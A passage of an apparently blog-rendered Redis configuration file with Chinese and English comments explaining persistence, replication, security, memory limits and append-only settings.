&#x4F7F;&#x7528;save&#x6307;&#x4EE4;&#xFF0C;&#x5E76;&#x6307;&#x5B9A;&#x6BCF;&#x9694;&#x591A;&#x5C11;&#x79D2;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x751F;&#x591A;&#x5927;&#x53D8;&#x5316;&#xFF0C;&#x8FDB;&#x884C;&#x5B58;&#x50A8;</span></span><br><span class="line"><span class="comment">#   number of write operations against the DB occurred.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   &#x5728;&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x884C;&#x4E3A;&#x662F;&#x4FDD;&#x5B58;&#xFF1A;</span></span><br><span class="line"><span class="comment">#   &#x8868;&#x793A;&#x5728;900&#x79D2;&#xFF08;15&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;1&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;</span></span><br><span class="line"><span class="comment">#   &#x8868;&#x793A;&#x5728;300&#x79D2;&#xFF08;5&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;10&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;</span></span><br><span class="line"><span class="comment">#   &#x8868;&#x793A;&#x5728;60&#x79D2;&#xFF08;1&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;10000&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   &#x5982;&#x679C;redis&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x9700;&#x505A;&#x6301;&#x4E45;&#x5316;&#xFF0C;&#x53EA;&#x662F;&#x4F5C;&#x4E3A;&#x7F13;&#x5B58;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6B64;&#x65B9;&#x5F0F;&#x5173;&#x95ED;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;</span></span><br><span class="line"><span class="comment">#   save &quot;&quot;</span></span><br><span class="line"></span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5728;&#x8FDB;&#x884C;&#x5FEB;&#x7167;&#x5907;&#x4EFD;&#x65F6;&#xFF0C;&#x4E00;&#x65E6;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x7684;&#x8BDD;&#x662F;&#x5426;&#x505C;&#x6B62;&#x5199;&#x64CD;&#x4F5C;</span></span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x538B;&#x7F29;&#xFF0C;&#x538B;&#x7F29;&#x4F1A;&#x6D88;&#x8017;CPU</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">rdbcompression yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x662F;&#x5426;&#x5BF9;RDB&#x6587;&#x4EF6;&#x505A;&#x6821;&#x9A8C;&#x7801;&#x68C0;&#x6D4B;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x6B64;&#x9879;&#x5B9A;&#x4E49;&#x5728;redis&#x542F;&#x52A8;&#x65F6;&#x52A0;&#x8F7D;RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5BF9;&#x6587;&#x4EF6;&#x68C0;&#x67E5;&#x6821;&#x9A8C;&#x7801;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x5728;redis&#x751F;&#x6210;RDB&#x6587;&#x4EF6;&#x65F6;&#x4F1A;&#x751F;&#x6210;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#xFF0C;&#x5728;redis&#x518D;&#x6B21;&#x542F;&#x52A8;&#x6216;&#x88C5;&#x8F7D;RDB&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x662F;&#x5426;&#x68C0;&#x6D4B;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x68C0;&#x6D4B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x6D88;&#x8017;&#x65F6;&#x95F4;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;redis&#x542F;&#x52A8;&#x65F6;&#x6162;&#xFF0C;&#x4F46;&#x662F;&#x80FD;&#x591F;&#x5224;&#x65AD;RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4EA7;&#x751F;&#x9519;&#x8BEF;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">rdbchecksum yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;RDB&#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;RDB&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x7684;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">dir /var/lib/redis</span><br><span class="line"></span><br><span class="line"><span class="comment">################################# REPLICATION #################################</span></span><br><span class="line"><span class="comment"># &#x914D;&#x7F6E;&#x4E3B;&#x4ECE;&#x76F8;&#x5173;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x6B64;&#x9879;&#x4E0D;&#x542F;&#x7528;&#x65F6;&#xFF0C;&#x5219;&#x4E3A;&#x4E3B;&#xFF0C;&#x5982;&#x679C;&#x542F;&#x52A8;&#x5219;&#x4E3A;&#x4ECE;&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x8981;&#x6307;&#x660E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#xFF0C;&#x7AEF;&#x53E3;</span></span><br><span class="line"><span class="comment"># slaveof &lt;masterip&gt; &lt;masterport&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x4E3B;&#x670D;&#x52A1;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#x8BA4;&#x8BC1;&#xFF0C;&#x90A3;&#x4E48;&#x4ECE;&#x7684;&#x5219;&#x9700;&#x8981;&#x542F;&#x7528;&#x6B64;&#x9879;&#x5E76;&#x6307;&#x660E;&#x4E3B;&#x7684;&#x8BA4;&#x8BC1;&#x5BC6;&#x7801;&#xFF1A;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># masterauth &lt;master-password&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x4ECE;&#x670D;&#x52A1;&#x5BF9;&#x4E3B;&#x670D;&#x52A1;&#x662F;&#x5426;&#x4E3A;&#x53EA;&#x8BFB;&#xFF08;&#x4EC5;&#x590D;&#x5236;&#xFF09;</span></span><br><span class="line">slave-serve-stale-data yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can configure a slave instance to accept writes or not. Writing against</span></span><br><span class="line"><span class="comment"># a slave instance may be useful to store some ephemeral data (because data</span></span><br><span class="line"><span class="comment"># written on a slave will be easily deleted after resync with the master) but</span></span><br><span class="line"><span class="comment"># may also cause problems if clients are writing to it because of a</span></span><br><span class="line"><span class="comment"># misconfiguration.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Since Redis 2.6 by default slaves are read-only.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> read only slaves are not designed to be exposed to untrusted clients</span></span><br><span class="line"><span class="comment"># on the internet. It&apos;s just a protection layer against misuse of the instance.</span></span><br><span class="line"><span class="comment"># Still a read only slave exports by default all the administrative commands</span></span><br><span class="line"><span class="comment"># such as CONFIG, DEBUG, and so forth. To a limited extent you can improve</span></span><br><span class="line"><span class="comment"># security of read only slaves using &apos;rename-command&apos; to shadow all the</span></span><br><span class="line"><span class="comment"># administrative / dangerous commands.</span></span><br><span class="line">slave-read-only yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replication SYNC strategy: disk or socket.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------</span></span><br><span class="line"><span class="comment"># WARNING: DISKLESS REPLICATION IS EXPERIMENTAL CURRENTLY</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># New slaves and reconnecting slaves that are not able to continue the replication</span></span><br><span class="line"><span class="comment"># process just receiving differences, need to do what is called a &quot;full</span></span><br><span class="line"><span class="comment"># synchronization&quot;. An RDB file is transmitted from the master to the slaves.</span></span><br><span class="line"><span class="comment"># The transmission can happen in two different ways:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1) Disk-backed: The Redis master creates a new process that writes the RDB</span></span><br><span class="line"><span class="comment">#                 file on disk. Later the file is transferred by the parent</span></span><br><span class="line"><span class="comment">#                 process to the slaves incrementally.</span></span><br><span class="line"><span class="comment"># 2) Diskless: The Redis master creates a new process that directly writes the</span></span><br><span class="line"><span class="comment">#              RDB file to slave sockets, without touching the disk at all.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># With disk-backed replication, while the RDB file is generated, more slaves</span></span><br><span class="line"><span class="comment"># can be queued and served with the RDB file as soon as the current child producing</span></span><br><span class="line"><span class="comment"># the RDB file finishes its work. With diskless replication instead once</span></span><br><span class="line"><span class="comment"># the transfer starts, new slaves arriving will be queued and a new transfer</span></span><br><span class="line"><span class="comment"># will start when the current one terminates.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># When diskless replication is used, the master waits a configurable amount of</span></span><br><span class="line"><span class="comment"># time (in seconds) before starting the transfer in the hope that multiple slaves</span></span><br><span class="line"><span class="comment"># will arrive and the transfer can be parallelized.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># With slow disks and fast (large bandwidth) networks, diskless replication</span></span><br><span class="line"><span class="comment"># works better.</span></span><br><span class="line">repl-diskless-sync no</span><br><span class="line"></span><br><span class="line"><span class="comment"># When diskless replication is enabled, it is possible to configure the delay</span></span><br><span class="line"><span class="comment"># the server waits in order to spawn the child that transfers the RDB via socket</span></span><br><span class="line"><span class="comment"># to the slaves.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is important since once the transfer starts, it is not possible to serve</span></span><br><span class="line"><span class="comment"># new slaves arriving, that will be queued for the next RDB transfer, so the server</span></span><br><span class="line"><span class="comment"># waits a delay in order to let more slaves arrive.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The delay is specified in seconds, and by default is 5 seconds. To disable</span></span><br><span class="line"><span class="comment"># it entirely just set it to 0 seconds and the transfer will start ASAP.</span></span><br><span class="line">repl-diskless-sync-delay 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># Slaves send PINGs to server in a predefined interval. It&apos;s possible to change</span></span><br><span class="line"><span class="comment"># this interval with the repl_ping_slave_period option. The default value is 10</span></span><br><span class="line"><span class="comment"># seconds.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># repl-ping-slave-period 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The following option sets the replication timeout for:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1) Bulk transfer I/O during SYNC, from the point of view of slave.</span></span><br><span class="line"><span class="comment"># 2) Master timeout from the point of view of slaves (data, pings).</span></span><br><span class="line"><span class="comment"># 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It is important to make sure that this value is greater than the value</span></span><br><span class="line"><span class="comment"># specified for repl-ping-slave-period otherwise a timeout will be detected</span></span><br><span class="line"><span class="comment"># every time there is low traffic between the master and the slave.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># repl-timeout 60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable TCP_NODELAY on the slave socket after SYNC?</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and</span></span><br><span class="line"><span class="comment"># less bandwidth to send data to slaves. But this can add a delay for</span></span><br><span class="line"><span class="comment"># the data to appear on the slave side, up to 40 milliseconds with</span></span><br><span class="line"><span class="comment"># Linux kernels using a default configuration.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If you select &quot;no&quot; the delay for data to appear on the slave side will</span></span><br><span class="line"><span class="comment"># be reduced but more bandwidth will be used for replication.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># By default we optimize for low latency, but in very high traffic conditions</span></span><br><span class="line"><span class="comment"># or when the master and slaves are many hops away, turning this to &quot;yes&quot; may</span></span><br><span class="line"><span class="comment"># be a good idea.</span></span><br><span class="line">repl-disable-tcp-nodelay no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the replication backlog size. The backlog is a buffer that accumulates</span></span><br><span class="line"><span class="comment"># slave data when slaves are disconnected for some time, so that when a slave</span></span><br><span class="line"><span class="comment"># wants to reconnect again, often a full resync is not needed, but a partial</span></span><br><span class="line"><span class="comment"># resync is enough, just passing the portion of data the slave missed while</span></span><br><span class="line"><span class="comment"># disconnected.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The bigger the replication backlog, the longer the time the slave can be</span></span><br><span class="line"><span class="comment"># disconnected and later be able to perform a partial resynchronization.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The backlog is only allocated once there is at least a slave connected.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># repl-backlog-size 1mb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># After a master has no longer connected slaves for some time, the backlog</span></span><br><span class="line"><span class="comment"># will be freed. The following option configures the amount of seconds that</span></span><br><span class="line"><span class="comment"># need to elapse, starting from the time the last slave disconnected, for</span></span><br><span class="line"><span class="comment"># the backlog buffer to be freed.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A value of 0 means to never release the backlog.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># repl-backlog-ttl 3600</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The slave priority is an integer number published by Redis in the INFO output.</span></span><br><span class="line"><span class="comment"># It is used by Redis Sentinel in order to select a slave to promote into a</span></span><br><span class="line"><span class="comment"># master if the master is no longer working correctly.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A slave with a low priority number is considered better for promotion, so</span></span><br><span class="line"><span class="comment"># for instance if there are three slaves with priority 10, 100, 25 Sentinel will</span></span><br><span class="line"><span class="comment"># pick the one with priority 10, that is the lowest.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># However a special priority of 0 marks the slave as not able to perform the</span></span><br><span class="line"><span class="comment"># role of master, so a slave with priority of 0 will never be selected by</span></span><br><span class="line"><span class="comment"># Redis Sentinel for promotion.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># By default the priority is 100.</span></span><br><span class="line">slave-priority 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># It is possible for a master to stop accepting writes if there are less than</span></span><br><span class="line"><span class="comment"># N slaves connected, having a lag less or equal than M seconds.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The N slaves need to be in &quot;online&quot; state.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The lag in seconds, that must be &lt;= the specified value, is calculated from</span></span><br><span class="line"><span class="comment"># the last ping received from the slave, that is usually sent every second.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This option does not GUARANTEE that N replicas will accept the write, but</span></span><br><span class="line"><span class="comment"># will limit the window of exposure for lost writes in case not enough slaves</span></span><br><span class="line"><span class="comment"># are available, to the specified number of seconds.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For example to require at least 3 slaves with a lag &lt;= 10 seconds use:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># min-slaves-to-write 3</span></span><br><span class="line"><span class="comment"># min-slaves-max-lag 10</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Setting one or the other to 0 disables the feature.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># By default min-slaves-to-write is set to 0 (feature disabled) and</span></span><br><span class="line"><span class="comment"># min-slaves-max-lag is set to 10.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A Redis master is able to list the address and port of the attached</span></span><br><span class="line"><span class="comment"># slaves in different ways. For example the &quot;INFO replication&quot; section</span></span><br><span class="line"><span class="comment"># offers this information, which is used, among other tools, by</span></span><br><span class="line"><span class="comment"># Redis Sentinel in order to discover slave instances.</span></span><br><span class="line"><span class="comment"># Another place where this info is available is in the output of the</span></span><br><span class="line"><span class="comment"># &quot;ROLE&quot; command of a masteer.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The listed IP and address normally reported by a slave is obtained</span></span><br><span class="line"><span class="comment"># in the following way:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   IP: The address is auto detected by checking the peer address</span></span><br><span class="line"><span class="comment">#   of the socket used by the slave to connect with the master.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   Port: The port is communicated by the slave during the replication</span></span><br><span class="line"><span class="comment">#   handshake, and is normally the port that the slave is using to</span></span><br><span class="line"><span class="comment">#   list for connections.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># However when port forwarding or Network Address Translation (NAT) is</span></span><br><span class="line"><span class="comment"># used, the slave may be actually reachable via different IP and port</span></span><br><span class="line"><span class="comment"># pairs. The following two options can be used by a slave in order to</span></span><br><span class="line"><span class="comment"># report to its master a specific set of IP and port, so that both INFO</span></span><br><span class="line"><span class="comment"># and ROLE will report those values.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># There is no need to use both the options if you need to override just</span></span><br><span class="line"><span class="comment"># the port or the IP address.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># slave-announce-ip 5.5.5.5</span></span><br><span class="line"><span class="comment"># slave-announce-port 1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################## SECURITY ###################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Require clients to issue AUTH &lt;PASSWORD&gt; before processing any other</span></span><br><span class="line"><span class="comment"># commands.  This might be useful in environments in which you do not trust</span></span><br><span class="line"><span class="comment"># others with access to the host running redis-server.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This should stay commented out for backward compatibility and because most</span></span><br><span class="line"><span class="comment"># people do not need auth (e.g. they run their own servers).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Warning: since Redis is pretty fast an outside user can try up to</span></span><br><span class="line"><span class="comment"># 150k passwords per second against a good box. This means that you should</span></span><br><span class="line"><span class="comment"># use a very strong password otherwise it will be very easy to break.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># requirepass foobared</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Command renaming.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It is possible to change the name of dangerous commands in a shared</span></span><br><span class="line"><span class="comment"># environment. For instance the CONFIG command may be renamed into something</span></span><br><span class="line"><span class="comment"># hard to guess so that it will still be available for internal-use tools</span></span><br><span class="line"><span class="comment"># but not available for general clients.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It is also possible to completely kill a command by renaming it into</span></span><br><span class="line"><span class="comment"># an empty string:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># rename-command CONFIG &quot;&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Please note that changing the name of commands that are logged into the</span></span><br><span class="line"><span class="comment"># AOF file or transmitted to slaves may cause problems.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################### LIMITS ####################################</span></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x4E0E;&#x8FDE;&#x63A5;&#x548C;&#x8D44;&#x6E90;&#x9650;&#x5236;&#x76F8;&#x5173;&#x7684;&#x914D;&#x7F6E;</span></span><br><span class="line"><span class="comment"># Set the max number of connected clients at the same time. By default</span></span><br><span class="line"><span class="comment"># this limit is set to 10000 clients, however if the Redis server is not</span></span><br><span class="line"><span class="comment"># able to configure the process file limit to allow for the specified limit</span></span><br><span class="line"><span class="comment"># the max number of allowed clients is set to the current file limit</span></span><br><span class="line"><span class="comment"># minus 32 (as Redis reserves a few file descriptors for internal uses).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x9650;&#x5236;&#xFF08;&#x5E76;&#x53D1;&#x6570;&#xFF09;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># maxclients 10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6700;&#x5927;&#x5185;&#x5B58;&#xFF0C;&#x9ED8;&#x8BA4;&#x6B64;&#x9879;&#x5173;&#x95ED;&#xFF0C;&#x8868;&#x793A;&#x6700;&#x5927;&#x5C06;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6700;&#x5927;&#x53EF;&#x7528;&#x5185;&#x5B58;</span></span><br><span class="line"><span class="comment"># maxmemory &lt;bytes&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MAXMEMORY POLICY: how Redis will select what to remove when maxmemory</span></span><br><span class="line"><span class="comment"># is reached. You can select among five behaviors:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># volatile-lru -&gt; remove the key with an expire set using an LRU algorithm</span></span><br><span class="line"><span class="comment"># allkeys-lru -&gt; remove any key according to the LRU algorithm</span></span><br><span class="line"><span class="comment"># volatile-random -&gt; remove a random key with an expire set</span></span><br><span class="line"><span class="comment"># allkeys-random -&gt; remove a random key, any key</span></span><br><span class="line"><span class="comment"># volatile-ttl -&gt; remove the key with the nearest expire time (minor TTL)</span></span><br><span class="line"><span class="comment"># noeviction -&gt; don&apos;t expire at all, just return an error on write operations</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> with any of the above policies, Redis will return an error on write</span></span><br><span class="line"><span class="comment">#       operations, when there are no suitable keys for eviction.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       At the date of writing these commands are: set setnx setex append</span></span><br><span class="line"><span class="comment">#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd</span></span><br><span class="line"><span class="comment">#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby</span></span><br><span class="line"><span class="comment">#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby</span></span><br><span class="line"><span class="comment">#       getset mset msetnx exec sort</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The default is:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># maxmemory-policy noeviction</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LRU and minimal TTL algorithms are not precise algorithms but approximated</span></span><br><span class="line"><span class="comment"># algorithms (in order to save memory), so you can tune it for speed or</span></span><br><span class="line"><span class="comment"># accuracy. For default Redis will check five keys and pick the one that was</span></span><br><span class="line"><span class="comment"># used less recently, you can change the sample size using the following</span></span><br><span class="line"><span class="comment"># configuration directive.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The default of 5 produces good enough results. 10 Approximates very closely</span></span><br><span class="line"><span class="comment"># true LRU but costs a bit more CPU. 3 is very fast but not very accurate.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># maxmemory-samples 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################## APPEND ONLY MODE ###############################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;AOF&#x7684;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#xFF0C;&#x4E00;&#x65E6;&#x6709;&#x67D0;&#x4E00;&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x5C06;&#x4FEE;&#x6539;&#x952E;&#x7684;&#x547D;&#x4EE4;&#x9644;&#x52A0;&#x5230;&#x547D;&#x4EE4;&#x5217;&#x8868;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x662F;&#x5426;&#x5F00;&#x542F;&#x6B64;&#x529F;&#x80FD;&#xFF0C;no&#x8868;&#x793A;&#x5173;&#x95ED;&#xFF0C;yes&#x8868;&#x793A;&#x5F00;&#x542F;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8BF4;&#x660E;&#xFF1A;RDB&#x548C;AOF&#x4E24;&#x79CD;&#x6301;&#x4E45;&#x529F;&#x80FD;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x542F;&#x7528;&#xFF0C;&#x4E24;&#x8005;&#x4E0D;&#x5F71;&#x54CD;</span></span><br><span class="line">appendonly no</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;AOF&#x6587;&#x4EF6; (default: &quot;appendonly.aof&quot;)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">appendfilename &quot;appendonly.aof&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If unsure, use &quot;everysec&quot;.</span></span><br><span class="line"><span class="comment"># &#x8868;&#x793A;&#x6BCF;&#x6B21;&#x6536;&#x5230;&#x5199;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x7ACB;&#x5373;&#x5199;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#x7684;AOF&#x6587;&#x4EF6;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x867D;&#x7136;&#x662F;&#x6700;&#x597D;&#x7684;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F;&#x6BCF;&#x6B21;&#x6709;&#x5199;&#x547D;&#x4EE4;&#x65F6;&#x90FD;&#x4F1A;&#x6709;&#x78C1;&#x76D8;&#x7684;I/O&#x64CD;&#x4F5C;&#xFF0C;&#x5BB9;&#x6613;&#x5F71;&#x54CD;redis&#x7684;&#x6027;&#x80FD;</span></span><br><span class="line"><span class="comment"># appendfsync always</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8868;&#x793A;&#x6BCF;&#x79D2;&#x949F;&#x5199;&#x4E00;&#x6B21;&#xFF0C;&#x4E0D;&#x7BA1;&#x6BCF;&#x79D2;&#x949F;&#x6536;&#x5230;&#x591A;&#x5C11;&#x4E2A;&#x5199;&#x8BF7;&#x6C42;&#x90FD;&#x5F80;&#x78C1;&#x76D8;&#x4E2D;&#x7684;AOF&#x6587;&#x4EF6;&#x4E2D;&#x5199;&#x4E00;&#x6B21;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">appendfsync everysec</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8868;&#x793A;append&#x529F;&#x80FD;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x63D0;&#x4EA4;&#x7ED9;OS&#xFF0C;&#x7531;OS&#x81EA;&#x884C;&#x51B3;&#x5B9A;&#x662F;&#x5982;&#x4F55;&#x5199;&#x7684;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># appendfsync 